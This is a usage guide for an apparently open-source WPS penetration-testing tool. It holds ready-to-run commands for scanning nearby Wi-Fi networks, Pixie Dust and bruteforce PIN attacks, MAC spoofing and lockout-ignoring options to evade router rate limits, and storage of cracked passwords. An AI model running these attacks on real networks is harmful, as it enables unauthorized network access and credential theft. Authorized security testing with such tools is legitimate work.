# FARHAN-Shot — Complete Linux / Kali Guide

> **For authorized penetration testing only.**  
> Only test networks you own or have explicit written permission to test.

---

## Table of Contents

1. [What is FARHAN-Shot?](#1-what-is-farhan-shot)
2. [Supported Linux Distributions](#2-supported-linux-distributions)
3. [System Requirements](#3-system-requirements)
4. [Installation](#4-installation)
   - [Kali Linux](#kali-linux)
   - [Debian / Ubuntu / Parrot OS](#debian--ubuntu--parrot-os)
   - [Arch Linux / Manjaro / BlackArch](#arch-linux--manjaro--blackarch)
   - [Fedora / RHEL / CentOS](#fedora--rhel--centos)
5. [Wireless Adapter Setup](#5-wireless-adapter-setup)
6. [Quick Start](#6-quick-start)
7. [All Attack Modes](#7-all-attack-modes)
8. [Scan Options](#8-scan-options)
9. [Advanced Options](#9-advanced-options)
10. [Output Files](#10-output-files)
11. [NetworkManager Handling](#11-networkmanager-handling)
12. [RF-Kill Handling](#12-rf-kill-handling)
13. [Session & Resume](#13-session--resume)
14. [Kali-Specific Tips](#14-kali-specific-tips)
15. [Troubleshooting](#15-troubleshooting)
16. [FAQ](#16-faq)

---

## 1. What is FARHAN-Shot?

FARHAN-Shot is a **WPS penetration testing framework** for Linux.  
It implements:

- **Pixie Dust attack** — offline WPS PIN recovery exploiting weak router RNG (Ralink, Broadcom, Realtek chipsets)
- **Online bruteforce** — sequential WPS PIN testing (Reaver-style)
- **Null PIN / Empty PIN** — tests if the AP accepts `00000000` or blank PIN
- **Push-button connect (PBC)** — WPS button emulation
- **Dictionary attack** — PIN wordlist testing
- **108+ PIN generation algorithms** — derived from BSSID, SSID, MAC OUI, and vendor databases

Cracked credentials are saved to **`FARHAN-Shot.txt`** and **`Wifi.txt`** automatically.

---

## 2. Supported Linux Distributions

| Distribution | Status | Notes |
|---|---|---|
| **Kali Linux** | Fully supported | All dependencies in official repos |
| **Parrot OS** | Fully supported | Same as Kali |
| **Kali NetHunter** | Fully supported | Android chroot with full Linux kernel |
| **Debian 10+** | Supported | May need pixiewps from backports |
| **Ubuntu 20.04+** | Supported | pixiewps may need manual build |
| **Arch Linux** | Supported | Use AUR for pixiewps |
| **Manjaro** | Supported | Use pamac / AUR |
| **BlackArch** | Fully supported | All tools pre-installed |
| **Fedora / RHEL** | Supported | Some tools need manual build |
| **Gentoo** | Partial | Must compile all tools from source |

---

## 3. System Requirements

| Requirement | Minimum |
|---|---|
| Python | **3.6+** (3.10+ recommended) |
| Privileges | **root / sudo** |
| Required tools | `wpa_supplicant`, `pixiewps`, `iw` |
| Optional tools | `rfkill`, `aircrack-ng`, `macchanger`, `nmcli`, `hashcat` |
| Wireless adapter | Must support **nl80211** driver (most USB/PCIe adapters do) |

Check your Python version:
```bash
python3 --version
```

---

## 4. Installation

### Kali Linux

Kali ships with all required tools. Just clone and run:

```bash
# Clone the repository
git clone https://github.com/Gtajisan/FARHAN-Shot.git
cd FARHAN-Shot

# Install any missing dependencies (usually not needed on Kali)
sudo apt update
sudo apt install -y wpasupplicant pixiewps iw rfkill aircrack-ng macchanger

# Run health check to verify everything
sudo python3 main.py --health -i wlan0
```

---

### Debian / Ubuntu / Parrot OS

```bash
# Update package list
sudo apt update

# Install required tools
sudo apt install -y \
    wpasupplicant \
    iw \
    rfkill \
    aircrack-ng \
    macchanger \
    network-manager

# pixiewps — try official repo first
sudo apt install -y pixiewps

# If not in repos (older Ubuntu), build from source:
# sudo apt install -y git build-essential libssl-dev cmake
# git clone https://github.com/wiire-a/pixiewps.git
# cd pixiewps && make && sudo make install && cd ..

# Clone FARHAN-Shot
git clone https://github.com/Gtajisan/FARHAN-Shot.git
cd FARHAN-Shot

# Run health check
sudo python3 main.py --health -i wlan0
```

---

### Arch Linux / Manjaro / BlackArch

```bash
# Arch official repos
sudo pacman -S --needed \
    wpa_supplicant \
    iw \
    util-linux \
    aircrack-ng \
    macchanger \
    networkmanager

# pixiewps from AUR
yay -S pixiewps
# or: pamac install pixiewps  (Manjaro)

# BlackArch (all tools pre-installed)
# sudo pacman -S blackarch-wireless

# Clone FARHAN-Shot
git clone https://github.com/Gtajisan/FARHAN-Shot.git
cd FARHAN-Shot

sudo python3 main.py --health -i wlan0
```

---

### Fedora / RHEL / CentOS

```bash
# Fedora
sudo dnf install -y \
    wpa_supplicant \
    iw \
    rfkill \
    aircrack-ng \
    macchanger

# pixiewps (may need manual build on Fedora)
sudo dnf install -y git cmake openssl-devel gcc
git clone https://github.com/wiire-a/pixiewps.git
cd pixiewps && make && sudo make install && cd ..

# Clone FARHAN-Shot
git clone https://github.com/Gtajisan/FARHAN-Shot.git
cd FARHAN-Shot

sudo python3 main.py --health -i wlan0
```

---

## 5. Wireless Adapter Setup

### Check your adapter is detected

```bash
# List all wireless interfaces
iw dev

# Or via ip
ip link show | grep -E 'wlan|wlp|wlx|ath'

# Check driver
iw phy
```

### Identify your interface name

Common names: `wlan0`, `wlan1`, `wlp2s0`, `wlx001122334455`

```bash
# FARHAN-Shot can auto-detect it — but you can also be explicit:
sudo python3 main.py -i wlan0 --scan-only
```

### Adapter compatibility

Your adapter must support **nl80211** (the standard Linux wireless driver framework).  
Almost all adapters sold after 2010 do. To verify:

```bash
iw list | grep -A5 'Supported interface modes'
# Should show: managed, AP, monitor, etc.
```

**Recommended adapters** for Kali/Linux WPS testing:
- Alfa AWUS036ACH (RTL8812AU)
- Alfa AWUS036NHA (AR9271)
- TP-Link TL-WN722N v1 (AR9271)
- Alfa AWUS036H (RTL8187)

---

## 6. Quick Start

```bash
# 1. Go to the tool directory
cd FARHAN-Shot

# 2. Run a health check first (always a good idea)
sudo python3 main.py --health -i wlan0

# 3. Scan for WPS targets
sudo python3 main.py -i wlan0 --scan-only

# 4. Run Pixie Dust on all visible WPS networks (interactive selection)
sudo python3 main.py -i wlan0 -K

# 5. Run Pixie Dust on a specific AP
sudo python3 main.py -i wlan0 -b AA:BB:CC:DD:EE:FF -K
```

---

## 7. All Attack Modes

### Pixie Dust (`-K`)

Best first attack. Works against WPS 1.0 routers with weak random number generators.

```bash
# Interactive: scan then select target
sudo python3 main.py -i wlan0 -K

# Target a specific AP
sudo python3 main.py -i wlan0 -b AA:BB:CC:DD:EE:FF -K

# With verbose wpa_supplicant output (debug mode)
sudo python3 main.py -i wlan0 -b AA:BB:CC:DD:EE:FF -K -v

# Force full pixiewps range (slower but more thorough)
sudo python3 main.py -i wlan0 -b AA:BB:CC:DD:EE:FF -K -F

# Print the raw pixiewps command (for manual testing)
sudo python3 main.py -i wlan0 -b AA:BB:CC:DD:EE:FF -K -X
```

### Online Bruteforce (`-B`)

Tries all generated WPS PINs sequentially. Slower but works on more routers.

```bash
# Basic bruteforce
sudo python3 main.py -i wlan0 -b AA:BB:CC:DD:EE:FF -B

# With 1 second delay between attempts (less aggressive)
sudo python3 main.py -i wlan0 -b AA:BB:CC:DD:EE:FF -B -d 1

# Ignore WPS lockout signals (continue even when AP says locked)
sudo python3 main.py -i wlan0 -b AA:BB:CC:DD:EE:FF -B -L

# Change MAC between attempts (helps bypass rate-limit)
sudo python3 main.py -i wlan0 -b AA:BB:CC:DD:EE:FF -B -M

# Limit to 50 PIN attempts
sudo python3 main.py -i wlan0 -b AA:BB:CC:DD:EE:FF -B -g 50
```

### Null PIN (`-N`)

Some routers accept the WPS PIN `00000000` (eight zeros).

```bash
sudo python3 main.py -i wlan0 -b AA:BB:CC:DD:EE:FF -N
```

### Empty PIN (`--empty-pin`)

Some older routers accept a completely blank PIN string.

```bash
sudo python3 main.py -i wlan0 -b AA:BB:CC:DD:EE:FF --empty-pin
```

### Specific PIN (`-p`)

Test a single known PIN.

```bash
sudo python3 main.py -i wlan0 -b AA:BB:CC:DD:EE:FF -p 12345670
```

### Dictionary Attack (`--wordlist`)

Provide a file of PINs to try (one per line).

```bash
sudo python3 main.py -i wlan0 -b AA:BB:CC:DD:EE:FF --wordlist /path/to/pins.txt
```

### Push-Button Connect (`--pbc`)

Emulate a WPS push-button press.

```bash
sudo python3 main.py -i wlan0 --pbc
```

### All PINs for a BSSID (`--all-pins`)

Try every PIN the tool can generate for the target BSSID.

```bash
sudo python3 main.py -i wlan0 -b AA:BB:CC:DD:EE:FF -B --all-pins
```

### Automated Pipeline (`--auto`)

Runs Pixie Dust → SSID hint PINs → algo PINs → bruteforce in order automatically.

```bash
sudo python3 main.py -i wlan0 -b AA:BB:CC:DD:EE:FF --auto
```

---

## 8. Scan Options

```bash
# Show scan results and exit (no attack)
sudo python3 main.py -i wlan0 --scan-only

# Only show nearby targets (signal stronger than -70 dBm)
sudo python3 main.py -i wlan0 --scan-only --min-rssi -70

# Sort by signal strength (closest first)
sudo python3 main.py -i wlan0 --scan-only --prefer-close

# Filter to a specific channel
sudo python3 main.py -i wlan0 --scan-only --channel 6

# Show only WPS 1.0 networks (most vulnerable)
sudo python3 main.py -i wlan0 --scan-only --wps1-only

# Reverse listing order
sudo python3 main.py -i wlan0 --scan-only -r

# Retry scan 5 times if it fails
sudo python3 main.py -i wlan0 --scan-only --scan-retries 5

# Single scan attempt only (no retry)
sudo python3 main.py -i wlan0 --scan-only --no-retry
```

### Reading the Scan Table

```
#   BSSID              ESSID                    Security    Ch/Band   Signal  Sig   Dist/SNR     VulnProb      Vendor / Model
--- ------------------ ------------------------ ----------- --------- ------- ----- ------------ ------------- ---------------------
1|  AA:BB:CC:DD:EE:FF  HomeNetwork              WPA2[WPS1.0⚠]   ch6 2.4G  -52    ████  Near/Good    HIGH 87% [PD] TP-Link Archer C7
2|  11:22:33:44:55:66  Office_WiFi              WPA2[WPS2.0]    ch1 2.4G  -71    ██    Mid/Fair     MED  45% [BF] Huawei HG8247
3|  FF:EE:DD:CC:BB:AA  LockedAP                 WPA2[WPS1.0⚠][LOCK]  ch11 2.4G -85 █  Far/Weak  LOW  12% [BF] Unknown
```

**Legend:**
- `[WPS1.0⚠]` — WPS version 1.0, highly vulnerable to Pixie Dust
- `[WPS2.0]`  — WPS version 2.0, harder to attack
- `[LOCK]`    — AP has signalled WPS lockout
- `[WPA3™]`  — WPA3 network (WPS attacks generally not applicable)
- `[H]`       — SSID contains a PIN hint pattern
- `HIGH`      — vulnerability score ≥ 70%, attack likely to succeed
- `MED`       — vulnerability score 35–69%
- `LOW`       — vulnerability score < 35%
- `PD`        — recommended attack: Pixie Dust
- `BF`        — recommended attack: Bruteforce

---

## 9. Advanced Options

### Kill Interfering Processes (`-k`)

NetworkManager, iwd, dhclient, and connman can all prevent wpa_supplicant from working.  
Use `-k` to stop them automatically before the attack:

```bash
sudo python3 main.py -i wlan0 -K -k

# Restore them on exit (--restore-procs)
sudo python3 main.py -i wlan0 -K -k --restore-procs
```

What `-k` does under the hood:
1. `sudo systemctl stop NetworkManager` (if systemd is present)
2. `sudo systemctl stop iwd`
3. Sends SIGTERM to any remaining wpa_supplicant, dhclient, or connman PIDs

### Save AP to NetworkManager (`--save-ap`)

After cracking, automatically save the credentials to NetworkManager so you can connect:

```bash
sudo python3 main.py -i wlan0 -b AA:BB:CC:DD:EE:FF -K --save-ap
```

### Disconnect via NetworkManager (`--use-nm`)

Let NetworkManager release the interface before the attack (alternative to `-k`):

```bash
sudo python3 main.py -i wlan0 -b AA:BB:CC:DD:EE:FF -K --use-nm
```

### MAC Address Spoofing (`-M`)

Change the MAC address between each PIN attempt. Helps bypass rate-limit defences:

```bash
sudo python3 main.py -i wlan0 -b AA:BB:CC:DD:EE:FF -B -M
```

Requires `macchanger`:
```bash
sudo apt install macchanger   # Kali/Debian/Ubuntu
sudo pacman -S macchanger      # Arch
```

### Session Save & Resume (`-s`)

Save progress to a file so you can resume a bruteforce later:

```bash
# Start (saves state every N attempts)
sudo python3 main.py -i wlan0 -b AA:BB:CC:DD:EE:FF -B -s /tmp/my_attack.json

# Resume (picks up where it left off)
sudo python3 main.py -i wlan0 -b AA:BB:CC:DD:EE:FF -B -s /tmp/my_attack.json
```

### Recurring Delay (`--recurring-delay`)

Add an extra sleep every N attempts to avoid triggering rate-limiters:

```bash
# Sleep 10 seconds every 5 attempts
sudo python3 main.py -i wlan0 -b AA:BB:CC:DD:EE:FF -B --recurring-delay 5:10
```

### Timeout & Timing Options

```bash
--timeout <s>          Per-connection WPS timeout in seconds [30]
-T <f>                 WPS M5/M7 message timeout [0.40 s]
--lock-delay <s>       Wait time when AP signals lockout [60 s]
--fail-wait <s>        Extra sleep after 10 consecutive failures [0 s]
-d <s>                 Fixed delay between PIN attempts [0 s]
```

### HTML Report (`--html-report`)

Generate a formatted HTML report on crack success:

```bash
sudo python3 main.py -i wlan0 -b AA:BB:CC:DD:EE:FF -K --html-report
# Report saved to: reports/report_<BSSID>.html
```

### CSV Output (`--csv-output`)

Append results to a CSV file on success:

```bash
sudo python3 main.py -i wlan0 -K --csv-output /home/user/cracked.csv
```

### Force a Specific PIN Algorithm (`--pin-algo`)

```bash
# Show the attack plan (which algorithms would be tried and why)
sudo python3 main.py -i wlan0 -b AA:BB:CC:DD:EE:FF --plan

# Force a specific algorithm
sudo python3 main.py -i wlan0 -b AA:BB:CC:DD:EE:FF -B --pin-algo pinArch
```

---

## 10. Output Files

All files are written to the **script directory** by default, with `~/` as fallback.

| File | Contents | When written |
|---|---|---|
| `FARHAN-Shot.txt` | Primary credential file | Every successful crack |
| `Wifi.txt` | Legacy credential file (compatibility) | Every successful crack |
| `store/FARHAN-Shot_crack_data.txt` | Persistent crack archive | Every successful crack |
| `reports/stored.txt` | Full record of cracked APs | When `-w`/`--write` is used |
| `reports/stored.csv` | Same data in CSV format | When `-w`/`--write` is used |
| `reports/report_<BSSID>.html` | HTML report | When `--html-report` is used |

**FARHAN-Shot.txt format:**
```
====================================================
 BSSID    : AA:BB:CC:DD:EE:FF
 SSID     : HomeNetwork
 Password : MyWiFiPassword123
 WPS PIN  : 12345670
 Captured : 2025-06-03 14:22:31
====================================================
```

---

## 11. NetworkManager Handling

NetworkManager is the biggest obstacle on Linux desktop systems. It holds the wireless interface and prevents wpa_supplicant from starting.

### Option A — Let the tool handle it (`-k`)

```bash
sudo python3 main.py -i wlan0 -K -k --restore-procs
# -k stops NM before attack, --restore-procs starts it back on exit
```

### Option B — Stop it manually before running

```bash
sudo systemctl stop NetworkManager
sudo python3 main.py -i wlan0 -K
sudo systemctl start NetworkManager
```

### Option C — Use nmcli to release the interface

```bash
sudo nmcli device disconnect wlan0
sudo python3 main.py -i wlan0 -K
```

### Option D — Disconnect only (`--use-nm`)

```bash
sudo python3 main.py -i wlan0 -K --use-nm
# Tells NM to release the interface, but keeps NM running
```

**Tip:** On Kali the tool auto-detects if NM is running and warns you at startup.

---

## 12. RF-Kill Handling

RF-Kill is a kernel mechanism that can software-block wireless adapters.

### Check status

```bash
# Using the tool
sudo python3 main.py -i wlan0 --show-rfkill

# Or directly
rfkill list

# Or via sysfs
cat /sys/class/rfkill/rfkill0/soft
# 0 = unblocked, 1 = blocked
```

### Unblock manually

```bash
sudo rfkill unblock wifi
# or
sudo rfkill unblock all
```

### Auto-unblock during attack

```bash
sudo python3 main.py -i wlan0 -K --handle-rfkill
# Automatically unblocks RF-Kill before starting the attack
```

The tool also has a sysfs fallback — if the `rfkill` binary is missing, it reads and writes `/sys/class/rfkill/*/soft` directly.

---

## 13. Session & Resume

Long bruteforce attacks can be interrupted. Use sessions to resume:

```bash
# Start bruteforce with session file
sudo python3 main.py -i wlan0 -b AA:BB:CC:DD:EE:FF -B -s /tmp/atk_AA_BB.json

# If interrupted (Ctrl+C), progress is saved
# Resume later:
sudo python3 main.py -i wlan0 -b AA:BB:CC:DD:EE:FF -B -s /tmp/atk_AA_BB.json
```

The session file stores:
- Last tested PIN
- Number of attempts made
- Timestamps
- Configuration options used

---

## 14. Kali-Specific Tips

### FARHAN-Shot auto-detects Kali

When running on Kali, the tool sets `OS Target = Kali` automatically, which:
- Sets the log directory to `/home/kali/OneShotPin_Log/`
- Shows Kali-specific install hints in the health check

### On Kali, all dependencies are one command away

```bash
sudo apt install -y wpasupplicant pixiewps iw rfkill aircrack-ng macchanger
```

### Recommended Kali workflow

```bash
# 1. Kill NetworkManager (Kali has it running by default)
sudo systemctl stop NetworkManager

# 2. Check RF-Kill
sudo rfkill unblock wifi

# 3. Run health check
sudo python3 main.py --health -i wlan0

# 4. Scan
sudo python3 main.py -i wlan0 --scan-only --prefer-close

# 5. Attack (Pixie Dust with MAC change, save AP on success)
sudo python3 main.py -i wlan0 -K -M --save-ap

# 6. Restore NetworkManager
sudo systemctl start NetworkManager
```

### One-liner with full cleanup

```bash
sudo python3 main.py -i wlan0 -K -k --restore-procs --handle-rfkill --save-ap
# -k = stop interfering processes
# --restore-procs = restart them on exit
# --handle-rfkill = auto-unblock RF-Kill
# --save-ap = save cracked AP to NetworkManager
```

### Kali NetHunter

FARHAN-Shot detects NetHunter automatically. Logs go to `/sdcard/nh_files/OneShotPin_Log/`.

```bash
# Inside NetHunter chroot terminal
sudo python3 main.py -i wlan0 -K
```

---

## 15. Troubleshooting

### `wpa_supplicant returned an error` / `Could not connect to wpa_supplicant`

**Cause:** Another process is holding the wireless interface.

```bash
# Fix 1: kill all conflicting processes
sudo python3 main.py -i wlan0 -K -k

# Fix 2: kill manually
sudo pkill wpa_supplicant
sudo systemctl stop NetworkManager
sudo systemctl stop iwd

# Fix 3: check for stale control socket
ls -la /tmp/wpa_ctrl_*
sudo rm -f /tmp/wpa_ctrl_*
```

---

### `iw scan timed out` / `command failed`

**Cause:** Interface driver busy, in wrong mode, or RF-Kill blocked.

```bash
# Check interface state
ip link show wlan0

# Bring interface up
sudo ip link set wlan0 up

# Check RF-Kill
sudo rfkill list
sudo rfkill unblock wifi

# Restart the interface
sudo ip link set wlan0 down
sudo ip link set wlan0 up
sleep 1
sudo python3 main.py -i wlan0 --scan-only --scan-retries 5
```

---

### `No WPS networks found`

**Cause:** No WPS-enabled APs in range, interface issue, or driver filter.

```bash
# Try a raw iw scan to verify the interface works
sudo iw dev wlan0 scan | grep -E 'SSID|WPS|BSS'

# Try with more retries
sudo python3 main.py -i wlan0 --scan-only --scan-retries 5

# Lower the RSSI threshold (show weaker networks too)
sudo python3 main.py -i wlan0 --scan-only --min-rssi -100
```

---

### `pixiewps not found`

```bash
# Kali / Debian / Ubuntu
sudo apt install pixiewps

# Arch / Manjaro
yay -S pixiewps

# Manual build (any distro)
sudo apt install -y build-essential libssl-dev cmake
git clone https://github.com/wiire-a/pixiewps.git
cd pixiewps
make
sudo make install
```

---

### `Permission denied` writing credential files

```bash
# The tool falls back to ~/FARHAN-Shot.txt automatically
# Or run from a writable directory:
cd ~
sudo python3 /path/to/FARHAN-Shot/main.py -i wlan0 -K
```

---

### `RF-Kill is blocking WiFi`

```bash
# Auto-unblock
sudo rfkill unblock wifi
# or with the tool flag:
sudo python3 main.py -i wlan0 -K --handle-rfkill

# Check if hardware kill switch is on your laptop
# Many laptops have a physical Fn+F key to enable/disable WiFi
```

---

### AP keeps locking WPS (`WPS locked` shown in scan)

```bash
# Wait for the AP to unlock (usually 60–300 seconds)
# Use --lock-delay to configure how long to wait:
sudo python3 main.py -i wlan0 -b AA:BB:CC:DD:EE:FF -B --lock-delay 120

# Or ignore locks entirely (risky — may cause permanent lockout):
sudo python3 main.py -i wlan0 -b AA:BB:CC:DD:EE:FF -B -L
```

---

### Pixie Dust fails / PIN not found

Not all routers are vulnerable to Pixie Dust. Try other methods:

```bash
# 1. Try bruteforce
sudo python3 main.py -i wlan0 -b AA:BB:CC:DD:EE:FF -B

# 2. Try null PIN
sudo python3 main.py -i wlan0 -b AA:BB:CC:DD:EE:FF -N

# 3. Check the attack plan (shows confidence for each method)
sudo python3 main.py -i wlan0 -b AA:BB:CC:DD:EE:FF --plan

# 4. Run automated pipeline (tries everything in order)
sudo python3 main.py -i wlan0 -b AA:BB:CC:DD:EE:FF --auto
```

---

## 16. FAQ

**Q: Do I need monitor mode?**  
A: No. FARHAN-Shot uses `wpa_supplicant` directly in managed mode. No monitor mode is required.

**Q: Which WPS version is more vulnerable?**  
A: **WPS 1.0** (`[WPS1.0⚠]` in the scan) is far more vulnerable. Most Pixie Dust attacks only work on WPS 1.0. WPS 2.0 (`[WPS2.0]`) has mitigations that make offline attacks harder.

**Q: My adapter shows in `iw dev` but the tool can't scan.**  
A: The interface might not be up. Run: `sudo ip link set wlan0 up` and try again.

**Q: Can I run it without root?**  
A: No. `wpa_supplicant` and direct interface control require root privileges.

**Q: How long does a bruteforce take?**  
A: WPS has 100,000,000 theoretical combinations but the actual PIN space is split (first half = 10,000, second half = 1,000), so a full bruteforce is at most ~11,000 attempts. At 1–3 attempts/second, that's 1–3 hours. The tool tries the most likely PINs first based on the BSSID, so it often succeeds in far fewer attempts.

**Q: How do I know if Pixie Dust will work?**  
A: Run `--plan` to see the vulnerability assessment:
```bash
sudo python3 main.py -i wlan0 -b AA:BB:CC:DD:EE:FF --plan
```
A `HIGH` Pixie Dust confidence means the router is likely vulnerable.

**Q: What does `[H]` mean in the scan?**  
A: The SSID contains a pattern that hints at the WPS PIN (e.g., the router uses the last 8 digits of the SSID as a PIN). The tool will try these SSID-derived PINs first.

**Q: Where are my cracked credentials?**  
A: In the script directory: `FARHAN-Shot.txt`, `Wifi.txt`, and `store/FARHAN-Shot_crack_data.txt`.

**Q: Can I use this on a VM?**  
A: Yes, but you must pass a physical USB wireless adapter through to the VM (USB passthrough). The VM's virtual NIC won't work.

**Q: The tool crashes or errors on my distro.**  
A: Run the health check first:
```bash
sudo python3 main.py --health -i wlan0
```
It will tell you exactly which tools are missing and the install command for your distro.

---

## Complete Reference

```
sudo python3 main.py [options]

REQUIRED:
  -i wlan0              Wireless interface (auto-detected if omitted)

ATTACK MODES:
  -K                    Pixie Dust attack
  -B                    Online bruteforce
  -N                    Null PIN (00000000)
  --empty-pin           Empty/blank PIN
  --pbc                 Push-button connect
  --auto                Automated pipeline

TARGET:
  -b AA:BB:CC:DD:EE:FF  Target BSSID (skip scan if specified)
  --ssid NAME           Target SSID (informational)
  -p 12345670           Use a specific PIN
  --all-pins            Try all generated PINs
  --wordlist FILE       Dictionary attack from file

SCAN:
  --scan-only           Scan and display, then exit
  --channel N           Filter to channel N
  --min-rssi -70        Hide networks below -70 dBm
  --prefer-close        Sort by signal (nearest first)
  --wps1-only           Only show WPS 1.0 networks
  --scan-retries N      iw scan retry count [3]
  --no-retry            No scan retries
  -r                    Reverse scan order

PROCESS & INTERFACE:
  -k                    Kill interfering processes
  --restore-procs       Restore killed processes on exit
  --use-nm              Use NetworkManager to release interface
  --handle-rfkill       Auto-unblock RF-Kill
  --show-rfkill         Show RF-Kill status and exit
  --iface-down          Bring interface down when done
  --mtk-wifi            MediaTek SoC driver activation

ATTACK TUNING:
  -d SECONDS            Delay between attempts
  --timeout N           WPS handshake timeout [30]
  -T FLOAT              M5/M7 timeout [0.40]
  --lock-delay N        Lockout back-off [60]
  -L                    Ignore WPS lockout signals
  -M                    MAC spoofing between attempts
  -g N                  Max PIN attempts [unlimited]
  --fail-wait S         Sleep after 10 failures
  --recurring-delay N:S Extra sleep every N attempts

OUTPUT:
  -w                    Write to reports/stored.txt + .csv
  -o FILE.json          Export to JSON
  --html-report         Generate HTML report
  --csv-output FILE     Append to CSV on success
  -v                    Verbose wpa_supplicant output
  --no-color            No ANSI colors
  --save-ap             Save AP to NetworkManager on success

SESSION:
  -s FILE               Session file (save/resume)

DIAGNOSTIC:
  --health              System health check and exit
  --plan                Show confidence-ordered attack plan
  --scan-only           Scan only

SECURITY MASKING:
  --hide-pin            Hide WPS PIN in output
  --hide-psk            Hide WPA password in output
  --hide-mac            Hide BSSID in output
  --half-pin            Show only second half of PIN
  --half-psk            Show only second half of password
```

---

*FARHAN-Shot v3.5.0 — For authorized security testing only.*  
*GitHub: https://github.com/Gtajisan/FARHAN-Shot*
